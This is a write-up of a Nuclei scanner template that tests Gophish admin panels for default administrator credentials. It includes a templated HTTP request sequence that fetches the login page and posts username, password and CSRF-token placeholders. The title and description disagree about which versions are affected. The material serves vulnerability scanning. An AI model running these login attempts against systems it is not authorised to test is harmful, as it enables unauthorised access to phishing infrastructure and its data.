# Nuclei Template: Gophish < v0.10.1 Default Credentials
**Template ID:** gophish-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`gophish-default-login.yaml`)

## Vulnerability Information & PoC

## Description
For versions of Gophish > 0.10.1, the temporary administrator credentials are printed in the logs when you first execute the Gophish binary.

## Steps to reproduce / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{user}}&password={{pass}}&csrf_token={{replace(url_encode(html_unescape(csrf_token)), "+", "%2B")}}
```

## References
- https://docs.getgophish.com/user-guide/getting-started
